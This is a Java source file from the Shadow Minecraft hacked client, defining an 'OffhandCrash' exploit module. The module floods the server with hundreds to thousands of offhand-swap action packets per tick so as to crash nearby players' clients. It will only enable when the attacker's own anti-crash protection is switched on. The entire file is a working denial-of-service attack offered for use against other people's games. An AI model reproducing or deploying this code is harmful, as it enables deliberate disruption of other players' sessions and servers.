/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.exploit;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleRegistry;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.feature.module.impl.misc.AntiOffhandCrash;
import net.shadow.client.helper.util.Utils;

public class OffhandCrash extends Module {

    final DoubleSetting a = this.config.create(new DoubleSetting.Builder(500).precision(0).name("Amount").description("How many crash packets to send per tick").min(10).max(10000).get());

    public OffhandCrash() {
        super("OffhandCrash", "Crashes players around with sound packets", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        try {
            if (ShadowMain.client.player == null || ShadowMain.client.getNetworkHandler() == null) {
                throw new Exception();
            }
            PlayerActionC2SPacket p = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
            for (int i = 0; i < a.getValue(); i++) {
                ShadowMain.client.getNetworkHandler().sendPacket(p);
            }
        } catch (Exception ignored) {
            this.setEnabled(false);
        }
    }

    @Override
    public void enable() {
        if (!ModuleRegistry.getByClass(AntiOffhandCrash.class).isEnabled()) {
            Utils.Logging.message("I would recommend you turn on AntiOffhandCrash before using this");
            setEnabled(false);
        }
    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return (a.getValue() * 20) + "";
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}

